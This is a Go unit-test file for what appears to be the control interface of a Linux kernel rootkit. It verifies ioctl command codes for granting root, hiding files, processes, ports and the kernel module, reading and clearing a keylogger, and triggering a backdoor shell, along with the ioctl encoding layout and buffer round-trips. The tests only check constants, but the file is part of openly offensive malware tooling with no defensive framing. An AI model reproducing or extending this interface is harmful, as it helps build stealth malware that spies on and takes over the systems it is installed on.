package ioctl

import (
	"bytes"
	"encoding/binary"
	"testing"
	"unsafe"
)

func TestIOCTLConstants(t *testing.T) {
	tests := []struct {
		name  string
		cmd   uintptr
		value uintptr
	}{
		{"GIVE_ROOT", IOCTL_GIVE_ROOT, 0xC001},
		{"HIDE_FILE", IOCTL_HIDE_FILE, 0x4100C002},
		{"UNHIDE_FILE", IOCTL_UNHIDE_FILE, 0x4100C003},
		{"HIDE_PID", IOCTL_HIDE_PID, 0x4004C004},
		{"UNHIDE_PID", IOCTL_UNHIDE_PID, 0x4004C005},
		{"HIDE_PORT", IOCTL_HIDE_PORT, 0x4002C006},
		{"UNHIDE_PORT", IOCTL_UNHIDE_PORT, 0x4002C007},
		{"LIST_HIDDEN", IOCTL_LIST_HIDDEN, 0x9000C008},
		{"KEYLOG_READ", IOCTL_KEYLOG_READ, 0x9000C009},
		{"KEYLOG_CLEAR", IOCTL_KEYLOG_CLEAR, 0xC00A},
		{"BACKDOOR_SHELL", IOCTL_BACKDOOR_SHELL, 0x4100C00B},
		{"BACKDOOR_MAGIC", IOCTL_BACKDOOR_MAGIC, 0x4010C00C},
		{"MODULE_HIDE", IOCTL_MODULE_HIDE, 0xC00D},
		{"MODULE_UNHIDE", IOCTL_MODULE_UNHIDE, 0xC00E},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if uintptr(tt.cmd) != tt.value {
				t.Errorf("%s = 0x%X, want 0x%X", tt.name, uintptr(tt.cmd), tt.value)
			}
		})
	}
}

func TestIOCTLMagic(t *testing.T) {
	if got := _IO(0xC0, 0x01); got != 0xC001 {
		t.Errorf("_IO(0xC0,1) = 0x%X, want 0xC001", got)
	}
	if got := _IOW(0xC0, 0x02, 256); got != 0x4100C002 {
		t.Errorf("_IOW(0xC0,2,256) = 0x%X, want 0x4100C002", got)
	}
	if got := _IOW(0xC0, 0x04, 4); got != 0x4004C004 {
		t.Errorf("_IOW(0xC0,4,4) = 0x%X, want 0x4004C004", got)
	}
	if got := _IOR(0xC0, 0x08, 4096); got != 0x9000C008 {
		t.Errorf("_IOR(0xC0,8,4096) = 0x%X, want 0x9000C008", got)
	}
}

func TestIOCLayout(t *testing.T) {
	// Verify our ioctl layout matches Linux uapi/asm-generic/ioctl.h
	cases := []struct {
		name string
		dir  uintptr
		typ  uintptr
		nr   uintptr
		size uintptr
		want uintptr
	}{
		{"IO(0xC0,1)", 0, 0xC0, 1, 0, 0xC001},
		{"IOW(0xC0,2,256)", 1, 0xC0, 2, 256, 0x4100C002},
		{"IOR(0xC0,8,4096)", 2, 0xC0, 8, 4096, 0x9000C008},
		{"IO(0xA4,1)", 0, 0xA4, 1, 0, 0xA401}, // random check
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := _IOC(c.dir, c.typ, c.nr, c.size)
			if got != c.want {
				t.Errorf("_IOC(%d,%x,%d,%d) = 0x%X, want 0x%X",
					c.dir, c.typ, c.nr, c.size, got, c.want)
			}
		})
	}
}

func TestBufferSerialization(t *testing.T) {
	pid := uint32(1337)
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, pid)
	if got := binary.LittleEndian.Uint32(buf); got != pid {
		t.Errorf("PID roundtrip: %d != %d", got, pid)
	}

	port := uint16(4444)
	pbuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(pbuf, port)
	if got := binary.LittleEndian.Uint16(pbuf); got != port {
		t.Errorf("Port roundtrip: %d != %d", got, port)
	}

	name := "test_hidden_file"
	nbuf := make([]byte, 256)
	copy(nbuf, name)
	if s := string(bytes.TrimRight(nbuf, "\x00")); s != name {
		t.Errorf("Name roundtrip: %q != %q", s, name)
	}
}

func TestPointerSafety(t *testing.T) {
	var p unsafe.Pointer
	if p != nil {
		t.Error("zero-value unsafe.Pointer should be nil")
	}

	buf := []byte{0}
	ptr := unsafe.Pointer(&buf[0])
	if ptr == nil {
		t.Error("valid pointer unexpectedly nil")
	}
}
